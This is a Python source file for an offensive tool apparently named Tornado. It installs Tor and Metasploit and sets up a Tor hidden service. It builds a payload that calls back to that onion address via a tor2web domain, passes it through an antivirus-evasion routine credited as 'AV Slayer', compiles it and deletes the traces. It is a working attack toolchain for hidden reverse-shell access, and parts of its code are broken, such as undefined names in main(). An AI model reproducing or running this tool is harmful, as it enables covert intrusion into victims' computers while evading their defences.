import os
import sys
import time
import build
import crypt
import config
import random
import string
import shutil
import signal
import hashlib
import subprocess
import stem.socket
import stem.connection
from stem.control import Controller
from colorama import init, Fore, Style
init(autoreset=True)
bblue = Fore.BLUE + Style.BRIGHT
blue = Fore.RED
bos = "\033[1;37m"

def requirements():
    if os.name == 'nt':
        if not os.path.isdir('C:\\Tor'):
            print(f"{bblue}[!]{bos} Tor expert bundle is downloading..")
            build.download_tor()
        else:
            print(f'{bblue}[*]{bos} Tor expert bundle is already downloaded.')
        if not os.path.isfile('C:\\Tor\\metasploitframework-latest.msi'):
            print(f"{bblue}[+]{bos} Metasploit Framework is downloading..")
            build.download_metasploit()
        else:
            print(f'{bblue}[*]{bos} Metasploit Framework is already downloaded.')
    else:
        req = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
        if req:
            print(f'{bblue}[!]{bos} Tor package is downloading..')
            subprocess.run(['sudo', 'apt', 'install', 'tor'], stdout=subprocess.PIPE)
        else:
            print(f'{bblue}[*]{bos} Tor expert bundle is exist.')
            subprocess.run(['tor', '--quiet', '&'], stdout=subprocess.PIPE)
        requ = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
        if requ:
            print(f'{bblue}[!]{bos} Unable to find msfvenom.')
            subprocess.run(['sudo', 'apt', 'install', 'metasploit-framework'])
        else:
            print(f'{bblue}[*]{bos} Msfvenom is exist.')

def connection():
    if os.name == 'nt':
        os.chdir('C:\\Tor')
        config.torrc()
        #subprocess.run(['C:\\Tor\\tor.exe', '--service', 'install', '-options', '-f', "C:\\Tor\\torrc"])
        #try: #it can be need install service i dont test anything. if any problem you have run this command.
        print(f"{bblue}[*]{bos} Creating hidden service in C:\Tor\hidden_service")
        p = subprocess.Popen(['C:\\Tor\\tor.exe', '-f', 'C:\\Tor\\torrc'])
        time.sleep(10)
        p.kill()
        with open ('C:\\Tor\\hidden_service\hostname', 'r') as r:
                host = r.read()
                print(f"{bblue}[+]{bos} Successfully: {bblue}{host}{bos}")
                resulhost = host + ".to"
                build.shell(resulhost)
    else:
        os.system("tor --quiet &")
        time.sleep(8)
        with Controller.from_port() as controller:
            controller.authenticate()
            print(f"{bblue}[*]{bos} Tor is running version {controller.get_version()}")
            print(f"{bblue}[*]{bos} Creating hidden service in hidden_service folder..")
            hidden_service = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service')
            result = controller.create_hidden_service(path=hidden_service ,port=80, target_port=1235)
            if result.hostname:
                print(f"{bblue}[*]{bos} Service is available at {result.hostname}")
                tor2web = result.hostname + ".to"
                build.shell(tor2web)       

def banner():
    z = """
                            Version 1.0.1
        [+] █████████████████████████████████████████████████████ [+]
                        Coded by github.com/samet-g\n
"""
    print(f"""{bblue}
            .-'''-.                                                  .-'''-.     
           '   _    \                               _______         '   _    \   
         /   /` '.   \            _..._             \  ___ `'.    /   /` '.   \  
        .   |     \  '          .'     '.            ' |--.\  \  .   |     \  '  
     .| |   '      |  '.-,.--. .   .-.   .           | |    \  ' |   '      |  ' 
   .' |_\    \     / / |  .-. ||  '   '  |    __     | |     |  '\    \     / /  
 .'     |`.   ` ..' /  | |  | ||  |   |  | .:--.'.   | |     |  | `.   ` ..' /   
'--.  .-'   '-...-'`   | |  | ||  |   |  |/ |   \ |  | |     ' .'    '-...-'`    
   |  |                | |  '- |  |   |  |`" __ | |  | |___.' /'                 
   |  |                | |     |  |   |  | .'.''| | /_______.'/                  
   |  '.'              | |     |  |   |  |/ /   | |_\_______|/                   
   |   /               |_|     |  |   |  |\ \._,\ '/                             
   `'-'                        '--'   '--' `--'  `"                              
    {bos}""")

def main():
    banner()
    requirements()
    connection()
    crypt.slayer() # thanks for awesome AV Slayer! by mertdas and whoismept
    crypt.compile()
    shutil.rmtree(hidden_service)
    print("Shutting down and clean junk files..")
    os.kill(int(subprocess.check_output(["pidof", "tor"])), signal.SIGTERM)
    os.system(f"rm -rf tornado.cpp template.cpp tornado.raw")
    crypter.cya()

if __name__ == "__main__":
    main()
